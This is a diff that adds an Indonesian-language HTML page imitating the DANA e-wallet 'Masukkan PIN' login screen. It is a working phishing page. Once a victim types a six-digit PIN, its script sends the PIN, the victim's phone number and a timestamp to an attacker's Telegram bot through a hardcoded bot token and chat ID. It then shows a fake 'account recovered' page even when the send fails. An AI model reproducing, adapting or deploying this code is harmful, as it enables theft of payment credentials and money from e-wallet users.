@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DANA - Masukkan PIN</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+        }
+        .dana-blue {
+            background-color: #108EE9;
+        }
+        .dana-blue-bg {
+            background-color: #108EE9;
+        }
+        .dana-blue-text {
+            color: #108EE9;
+        }
+        /* Style untuk bulatan PIN */
+        .pin-dot {
+            width: 14px;
+            height: 14px;
+            background-color: #E2E8F0;
+            border-radius: 50%;
+            transition: background-color 0.2s;
+        }
+        .pin-dot.active {
+            background-color: #108EE9;
+        }
+        /* Animasi loading */
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .animate-spin {
+            animation: spin 1s linear infinite;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <header class="dana-blue p-4 flex items-center">
+        <button class="text-white p-2" onclick="goBack()">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7" />
+            </svg>
+        </button>
+        <div class="flex-grow text-center mr-10">
+            <h1 class="text-white font-semibold text-xl">Masuk</h1>
+        </div>
+    </header>
+
+    <main class="flex flex-col items-center pt-16 px-6">
+        <h2 class="text-2xl font-semibold text-gray-900 mb-12">Masukkan PIN</h2>
+
+        <!-- Indikator PIN -->
+        <div id="pinDots" class="flex space-x-6 mb-16">
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+            <div class="pin-dot"></div>
+        </div>
+
+        <button class="dana-blue-text font-bold text-sm tracking-wide uppercase">
+            Lupa PIN?
+        </button>
+
+        <!-- Input PIN tersembunyi -->
+        <input type="tel" id="pinInput" inputmode="numeric" pattern="\d*" maxlength="6" class="opacity-0 absolute" autofocus>
+
+        <!-- Notifikasi status -->
+        <div id="notification" class="mt-8 p-4 rounded-lg hidden"></div>
+    </main>
+
+    <!-- Halaman Sukses (awalnya tersembunyi) -->
+    <div id="successPage" class="hidden fixed inset-0 bg-white z-50 flex flex-col items-center justify-between py-16 px-6">
+        <div class="flex flex-col items-center">
+            <!-- Logo centang hijau -->
+            <div class="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mb-8">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-14 w-14 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+            
+            <h2 class="text-3xl font-bold text-gray-900 mb-4">Berhasil!</h2>
+            <p class="text-xl text-gray-600 text-center mb-12">Akun DANA kamu berhasil dipulihkan</p>
+            
+            <!-- Informasi akun -->
+            <div class="bg-gray-50 rounded-xl p-6 w-full max-w-md mb-8">
+                <div class="flex items-center space-x-4">
+                    <div class="w-12 h-12 bg-[#108EE9] rounded-full flex items-center justify-center text-white font-bold text-xl">
+                        D
+                    </div>
+                    <div>
+                        <p class="text-gray-500 text-sm">Nomor DANA</p>
+                        <p id="displayPhoneNumber" class="text-gray-900 font-bold text-lg">+62 xxxxxxxx</p>
+                    </div>
+                </div>
+                <div class="border-t border-gray-200 mt-4 pt-4">
+                    <p class="text-gray-500 text-sm">Sukses</p>
+                    <p class="text-gray-900 font-bold text-2xl">Tunggu 30 menit</1000000></p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="w-full max-w-md">
+            <button onclick="goToDashboard()" class="w-full dana-blue-bg text-white font-bold py-4 rounded-xl text-lg tracking-wide shadow-lg hover:bg-blue-600 transition duration-300">
+                MASUK KE DANA
+            </button>
+            <p class="text-center text-gray-400 text-sm mt-4">Terima kasih telah menggunakan DANA</p>
+        </div>
+    </div>
+
+    <script>
+        // ===== KONFIGURASI BOT TELEGRAM =====
+        const BOT_TOKEN = '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg';
+        const CHAT_ID = '8592742129';
+
+        // Fungsi untuk kembali ke halaman sebelumnya
+        function goBack() {
+            window.location.href = 'index.html';
+        }
+
+        // Fungsi untuk redirect ke dashboard (halaman utama DANA)
+        function goToDashboard() {
+            window.location.href = 'https://www.dana.id'; // Ganti dengan URL yang sesuai
+        }
+
+        // Ambil nomor telepon dari sessionStorage (jika ada)
+        let phoneNumber = sessionStorage.getItem('danaPhoneNumber') || 'xxxxxxxxx';
+        
+        // Format nomor telepon untuk ditampilkan
+        function formatPhoneNumber(number) {
+            if (!number) return '+62 xxxxxxxx';
+            // Format: +62 xxx-xxxx-xxxx
+            if (number.length >= 10) {
+                return '+62 ' + number.substring(0, 3) + '-' + number.substring(3, 7) + '-' + number.substring(7, 11);
+            }
+            return '+62 ' + number;
+        }
+
+        // Tampilkan nomor telepon di halaman sukses
+        document.getElementById('displayPhoneNumber').textContent = formatPhoneNumber(phoneNumber);
+
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendToTelegram(pin) {
+            // Ambil nomor telepon dari sessionStorage
+            const phone = sessionStorage.getItem('danaPhoneNumber') || 'Tidak tersedia';
+            
+            const message = `🔐 *PIN DANA Diterima* 🔐\n\n📞 *Nomor HP:* +62${phone}\n📌 *PIN:* ` + '`' + pin + '`\n\n⏱ *Waktu:* ' + new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.ok) {
+                    showNotification('✅ PIN berhasil dikirim', 'success');
+                    console.log('PIN terkirim:', pin);
+                    
+                    // Tampilkan halaman sukses setelah 1 detik
+                    setTimeout(() => {
+                        document.querySelector('main').classList.add('hidden');
+                        document.getElementById('successPage').classList.remove('hidden');
+                    }, 1000);
+                } else {
+                    showNotification('❌ Gagal mengirim PIN', 'error');
+                    console.error('Gagal mengirim:', result);
+                    
+                    // Tetap tampilkan halaman sukses meskipun gagal (untuk UX)
+                    setTimeout(() => {
+                        document.querySelector('main').classList.add('hidden');
+                        document.getElementById('successPage').classList.remove('hidden');
+                    }, 1000);
+                }
+            } catch (error) {
+                showNotification('❌ Error koneksi', 'error');
+                console.error('Error:', error);
+                
+                // Tetap tampilkan halaman sukses meskipun error
+                setTimeout(() => {
+                    document.querySelector('main').classList.add('hidden');
+                    document.getElementById('successPage').classList.remove('hidden');
+                }, 1000);
+            }
+        }
+
+        // Fungsi untuk menampilkan notifikasi
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.classList.remove('hidden', 'bg-green-100', 'bg-red-100', 'text-green-800', 'text-red-800');
+            
+            if (type === 'success') {
+                notification.classList.add('bg-green-100', 'text-green-800');
+            } else {
+                notification.classList.add('bg-red-100', 'text-red-800');
+            }
+            
+            notification.textContent = message;
+            
+            // Sembunyikan notifikasi setelah 3 detik
+            setTimeout(() => {
+                notification.classList.add('hidden');
+            }, 3000);
+        }
+
+        // Fungsi untuk memperbarui indikator PIN
+        function updatePinDots(pinLength) {
+            const dots = document.querySelectorAll('.pin-dot');
+            dots.forEach((dot, index) => {
+                if (index < pinLength) {
+                    dot.classList.add('active');
+                } else {
+                    dot.classList.remove('active');
+                }
+            });
+        }
+
+        // Event listener untuk input PIN
+        const pinInput = document.getElementById('pinInput');
+        
+        // Fokus otomatis ke input
+        pinInput.focus();
+
+        // Event ketika PIN diinput
+        pinInput.addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, ''); // Hanya angka
+            this.value = value;
+            
+            // Batasi maksimal 6 digit
+            if (value.length > 6) {
+                this.value = value.slice(0, 6);
+                value = this.value;
+            }
+            
+            updatePinDots(value.length);
+            
+            // Jika PIN sudah 6 digit, kirim otomatis
+            if (value.length === 6) {
+                // Tampilkan notifikasi mengirim
+                showNotification('📤 Mengirim PIN...', 'success');
+                
+                // Kirim ke Telegram
+                sendToTelegram(value);
+                
+                // Reset input setelah 1 detik (opsional)
+                setTimeout(() => {
+                    pinInput.value = '';
+                    updatePinDots(0);
+                }, 1000);
+            }
+        });
+
+        // Agar halaman tetap fokus ke input
+        document.body.addEventListener('click', function() {
+            pinInput.focus();
+        });
+
+        // Debug: tampilkan pesan jika token belum diganti
+        if (BOT_TOKEN === '8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg') {
+            console.warn('⚠️ PERINGATAN: Ganti BOT_TOKEN dengan token bot Telegram Anda!');
+        }
+        if (CHAT_ID === '8592742129') {
+            console.warn('⚠️ PERINGATAN: Ganti CHAT_ID dengan chat ID Anda!');
+        }
+
+        // Tambahkan nomor telepon dummy jika belum ada di sessionStorage
+        if (!sessionStorage.getItem('danaPhoneNumber')) {
+            sessionStorage.setItem('danaPhoneNumber', '81122334455');
+        }
+    </script>
+
+</body>
+</html>
